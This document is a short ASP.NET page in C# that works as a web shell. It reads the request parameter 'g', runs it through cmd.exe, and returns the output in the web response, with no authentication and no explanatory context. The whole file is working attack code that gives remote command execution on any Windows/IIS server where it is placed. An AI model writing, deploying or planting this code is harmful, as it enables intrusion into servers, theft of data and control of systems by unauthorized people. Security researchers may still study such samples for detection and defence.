<%@ Page Language="c#"%>
<%
global::System.Diagnostics.ProcessStartInfo psi = new global::System.Diagnostics.ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c " + Request.Params.Get("g");
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
global::System.Diagnostics.Process p = global::System.Diagnostics.Process.Start(psi);
System.IO.StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
Response.Write(s);
%>